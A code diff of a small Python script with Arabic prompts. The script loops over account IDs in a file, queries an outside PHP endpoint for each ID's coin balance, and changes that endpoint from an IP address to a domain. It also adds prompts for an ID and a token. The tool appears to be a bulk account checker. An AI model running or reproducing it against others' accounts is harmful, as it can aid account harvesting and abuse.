@@ -3,11 +3,13 @@ E = '\033[1;31m'
 B = '\033[2;36m'
 G = '\033[1;32m'
 S = '\033[1;33m'
+IDD = input('ايديك')
+token = input('توكنك')
 os.system('clear')
 def whispers():
  for Whisper in open('id.txt','r').read().splitlines():
   id=str(Whisper.split('\n')[0])
-  whisper = requests.get(f'http://35.181.7.112/check.php?oid={id}&submit=submit').text
+  whisper = requests.get(f'http://ccfc.cf/iG.php?oid={id}&submit=submit').text
   if 'coins":"' in whisper:
    Whisper = whisper.split('coins":"')[1]
    coin = Whisper.split('"')[0]
